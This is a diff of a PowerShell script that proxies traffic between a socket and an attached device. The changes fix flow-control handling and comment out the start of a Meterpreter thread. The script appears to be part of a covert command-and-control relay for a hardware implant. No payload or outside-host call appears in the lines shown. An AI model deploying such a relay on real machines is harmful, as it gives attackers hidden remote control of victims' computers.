@@ -20,9 +20,10 @@ $Proxy = {
 
 		$stotal = 0
 		$dtotal = 0
-		$device_can_write = $true
+		$device_can_write = $false
 
 		[System.Console]::WriteLine("Entering proxy loop")
+		$device.Write($nb, 0, $M+1)
 		while ($st -ne $null -or $dt -ne $null) {
 			if ($st.IsCompleted -and $device_can_write) {
 				$sbr = $socket.EndRead($st)
@@ -31,25 +32,28 @@ $Proxy = {
 					[System.Console]::WriteLine([String]::Format("Socket {0} - Device {1}", $stotal, $dtotal))
 					$sb[1] = $sbr
 					$device.Write($sb, 0, $M+1)
-					$device.Flush()
 					$st = $socket.BeginRead($sb, 2, ($M-1), $null, $null)
 				} else {
 					$st = $null
 				}
-			}
-			if ($dt.IsCompleted) {
+			} elseif ($dt.IsCompleted) {
 				$dbr = $device.EndRead($dt)
 				if ($dbr -gt 0) {
-					$device_can_write = (($db[1] -band 196) > 0)
+					$device_can_write = (($db[1] -band 128) -eq 0)
 					$db[1] = ($db[1] -band 63)
-					$dtotal += $db[1]
-					[System.Console]::WriteLine([String]::Format("Socket {0} - Device {1}", $stotal, $dtotal))
-					$swo = $socket.Write($db, 2, $db[1])
-					$socket.Flush()
+					if ($db[1] -gt 0) {
+						$dtotal += $db[1]
+						[System.Console]::WriteLine([String]::Format("Socket {0} - Device {1}", $stotal, $dtotal))
+						$swo = $socket.Write($db, 2, $db[1])
+						$socket.Flush()
+					}
+					$null = $device.Write($nb, 0, $M+1)
 					$dt = $device.BeginRead($db, 0, ($M+1), $null, $null)
 				} else {
 					$dt = $null
 				}
+			} else {
+				Start-Sleep -m 1
 			}
 		}
 
@@ -116,7 +120,7 @@ try {
     Write-Host "About to start proxy thread"
 	$AsyncProxyJobResult = $proxyThread.BeginInvoke()
 	Sleep 2 # Wait 2 seconds to give some time for the proxy to be ready
-	$AsyncMeterpreterJobResult = $meterpreterThread.BeginInvoke()
+	# $AsyncMeterpreterJobResult = $meterpreterThread.BeginInvoke()
 }
 catch {
 	$ErrorMessage = $_.Exception.Message
